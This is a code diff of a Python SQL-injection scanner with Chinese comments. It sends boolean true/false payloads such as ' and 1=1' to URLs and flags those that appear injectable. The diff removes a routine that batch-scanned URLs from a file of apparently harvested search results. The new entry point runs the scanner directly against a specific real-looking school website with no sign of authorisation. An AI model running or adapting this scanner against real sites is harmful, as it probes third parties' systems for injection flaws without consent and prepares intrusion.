@@ -13,7 +13,11 @@ class Sql:
         self.target = ''
         self.waf = ''
         self.payload = {' and 1=1': ' and 1=2', "' and '1'='1": "' and '1'='2"}
-        self.payload = {' and 1=1':' and 1=2', "' and '1'='1":"' and '1'='2"}
+        self.payload = {' and 1=1': ' and 1=2', "' and '1'='1": "' and '1'='2"}
+
+    def init(self):
+        if not self.target.startswith('http://') and not self.target.startswith('https://'):
+            self.target = 'http://' + self.target
 
     @staticmethod
     def _conn(url):
@@ -92,41 +96,16 @@ class Sql:
             print('不存在注入'+str(e))
             return False
 
-    def get_sql_in(self):
-        sql_in = []
-        pattern = re.compile('(.*\?.*=\d+)|(.*/\d+)')
-        for target in self.targets:
-            if re.search(pattern, target):
-                sql_in.append(target)  # 获取所有可能的注入点
-        self.targets = sql_in
-
     def run(self):
-        print("\n# 检测SQL注入:")
         results = []
-        self.get_sql_in()
         for target in self.targets:
             self.target = target
+            self.init()
             result = self._scan()
             if result:
                 print('可能存在注入:' + result)
                 results.append(result)
         return results
 
-
-def main():
-    targets = []
-    with open('baidu/2.txt', 'r') as file:
-        with open('sql/1.txt', 'a+') as sql_file:
-            for url in file:
-                targets.append(url.strip())
-            try:
-                s = Sql(targets)
-                _targets = s.run()
-                for target in _targets:
-                    sql_file.write(target + '\n')
-            except Exception as e:
-                print(e)
-
-
 if __name__ == '__main__':
-    main()
+    Sql(['http://nhez.nh.edu.sh.cn/xwgf/show.php?id=4479']).run()
